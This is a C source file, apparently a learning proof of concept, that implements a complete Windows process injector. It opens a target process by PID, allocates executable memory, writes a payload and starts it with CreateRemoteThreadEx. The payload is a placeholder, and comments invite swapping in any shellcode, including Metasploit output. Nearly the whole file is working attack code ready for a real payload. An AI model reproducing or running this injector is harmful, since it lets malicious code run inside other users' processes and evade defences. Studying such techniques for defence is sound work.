//Simple process injector just change toEmbed to the shell code or script you want to insert
//Display of how to use CreateRemoteThread
//Remember you can only build the project in VScode for it to work properly
//Yes this whole script is needed just to showcase one function
/*Function Syntax:
	HANDLE CreateRemoteThreadEx(
	[in]            HANDLE                       hProcess,
	[in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
	[in]            SIZE_T                       dwStackSize,
	[in]            LPTHREAD_START_ROUTINE       lpStartAddress,
	[in, optional]  LPVOID                       lpParameter,
	[in]            DWORD                        dwCreationFlags,
	[in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
	[out, optional] LPDWORD                      lpThreadId
	);
*/
#include <windows.h>
#include <stdio.h>

HANDLE hProcess, hThread = NULL;
DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
//just a POC the one with real shellcode from metasploit is in win10 VM
unsigned char toEmbed[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41";
SIZE_T size_of_toEmbed = sizeof(toEmbed);

int main(int argc, char* argv[]) {

	//checking for arguments given
	if (argc < 2) {
		printf("Usage: program.exe <PID>\n");
		return EXIT_FAILURE;
	}
	//taking the first argument and converting it to an INT
	//because when it comes in it is a char[]
	PID = atoi(argv[1]);
	printf("\nTrying to open a handle to process with PID: %ld\n", PID);
	//Opening a handle to the process using the provided PID
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("\nFailed to get a handle to process with PID %ld error %ld\n", PID, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("\nGot a handle to the process!\n\\---0x%p\n", hProcess);

	//allocate memory needed to prepare the space before writing the data in
	rBuffer = VirtualAllocEx(hProcess, NULL,size_of_toEmbed, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("\n%zu-bytes was alloceted with PAGE_EXECUTE_READWRITE permissions!\n", size_of_toEmbed);

	//write allocated memory to the process memory
	WriteProcessMemory(hProcess, rBuffer, toEmbed, size_of_toEmbed, NULL);
	printf("\nWrote %zu-bytes to process memory\n", size_of_toEmbed);
	
	//Create thread to run allocated payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
	if (hThread == NULL) {
		printf("\nFailed to get a handle to the thread, error %ld\n", GetLastError());
		CloseHandle(hThread);
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("\nGot a handle to the Thread!\n\\---0x%p\n", hThread);

	printf("\nPayload Executing...\n");
	WaitForSingleObject(hThread, INFINITE);
	printf("Payload Finished executing\n");
	printf("Cleaning Up :)\n");
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("\nAll Done.\n");
	return EXIT_SUCCESS;
}